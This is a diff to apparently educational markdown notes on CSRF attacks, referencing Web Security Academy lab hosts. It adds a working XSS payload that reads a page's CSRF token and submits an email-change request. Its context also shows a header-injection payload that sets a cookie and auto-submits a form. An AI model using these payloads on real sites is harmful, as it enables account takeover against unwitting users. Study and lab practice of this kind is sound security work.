@@ -71,6 +71,31 @@ To exploit a CSRF token + cookie mechanism, two actions are required:
 <img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 
+### XSS Based CSRF Attack
+
+```html
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = handleResponse;
+  req.open('get', '/my-account', true);
+  req.send();
+
+  function handleResponse() {
+    // Extract the CSRF token from the response
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+
+    // Display the token in a popup alert
+    alert('Extracted CSRF Token: ' + token);
+
+    // Send a POST request to change the email
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf=' + token + '&email=test@test.com');
+  }
+</script>
+```
+
 ---
 
 ## Testing the Referer Header for CSRF Attack
